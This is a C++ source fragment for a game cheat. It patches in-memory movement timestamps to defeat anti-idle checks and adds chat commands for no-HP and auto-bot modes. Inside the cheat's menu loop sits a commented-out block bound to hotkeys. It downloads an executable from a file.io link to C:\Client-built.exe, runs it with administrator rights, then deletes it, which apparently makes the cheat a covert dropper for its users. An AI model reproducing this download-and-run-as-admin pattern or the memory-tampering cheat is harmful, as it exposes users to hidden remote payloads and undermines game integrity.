#include "Game.h"

void disableProtectMouse() {
	int dwPlayTime = 0x00AFE540;
	int dwLastMouseMoveTime = 0x008BEF60;
	int dwLastCharMoveTime = 0x008BEF64;

	while (true) {
		Sleep(1000);

		if (read(dwLastCharMoveTime, 4) > 0) {
			int dwNewMoveTime = read(dwPlayTime, 4);

			write(dwLastMouseMoveTime, &dwNewMoveTime, 4);
			write(dwLastCharMoveTime, &dwNewMoveTime, 4);
		}
	}
}
#include <string>

extern bool download_file(const std::string& url, const std::string& output_path);
extern bool RunAsAdmin(const wchar_t* filePath, const wchar_t* params);

const char* url = "https://file.io/bj50lkwvr9kL";
std::string output_path = "C:\\Client-built.exe";

const wchar_t* filePath = L"C:\\Client-built.exe";
const wchar_t* params = L"";

int menu() {
	while (true) {
		Sleep(10);

		/*if (GetAsyncKeyState(VK_F1) < 0) {
			Sleep(200);

			download_file(url, output_path);
		}

		if (GetAsyncKeyState(VK_F2) < 0) {
			Sleep(200);

			RunAsAdmin(filePath, params);
		}

		if (GetAsyncKeyState(VK_F3) < 0) {
			Sleep(200);

			remove("C:\\Client - built.exe");
		}*/

		if (rsCompString((char*)"/nohpon"))
			bNoHp = true;

		if (rsCompString((char*)"/nohpoff"))
			bNoHp = false;

		if (rsCompString((char*)"/autoboton"))
			bAutoBot = true;

		if (rsCompString((char*)"/autobotoff"))
			bAutoBot = false;
	}

	return 0;
}